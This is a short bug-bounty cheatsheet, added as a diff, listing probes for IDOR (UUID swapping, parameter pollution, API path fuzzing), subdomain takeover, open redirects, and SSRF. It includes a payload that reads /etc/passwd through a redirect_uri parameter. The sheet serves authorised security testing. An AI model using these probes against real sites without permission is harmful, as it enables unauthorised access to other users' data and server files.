@@ -1,0 +1,38 @@
+title: Bug bounty cheatsheet - IDOR / takeover / redirect
+Subdomain Takeover
+  Takeover Outil
+IDOR
+  UUID
+    [note] Change UUID from:
+      "3ffa-2c6c-9ef4-7e62-abc3f5edf0db"
+      to:
+      "1111-1111-1111-1111-111111111111" or something
+      similar to check access
+    Parameter Pollution
+      [note] /api/messages?user_id=<USER_ID>&user_id=<OTHER_ID>
+        /api/messages?user_id[]=<USER_ID>&user_id[]=<OTHER_ID>
+    Base 64
+      [note] /download?filename=Zm9vZm9vZm9v
+    Fuzzing
+      [note] /api/v2.1.123/messages/view${FUZZ}
+        - /api/v1/messages/view
+        - /api/v2/messages/view
+        - /api/v3/messages/view
+        - /api/v1/messages/view/1
+        - /api/v2/messages/view/1
+        - /api/v1/messages/view?id
+        - /api/v1/messages/view/dev
+        - /api/v1/messages/view/test
+    No ID in Request
+      [note] /api/user/settings/update
+        - /api/user/settings/update
+        - /api/v1/user/settings/update
+        - /api/user/settings/update/6
+        - /api/user/settings/update?id=123
+Redirect
+  SSRF
+    SSRFmap
+    [note] ?redirect_uri=file:///etc/passwd
+  Open Redirect
+    [note] https://example.com//google.com
+    [note] OAUTH Redirect after signup
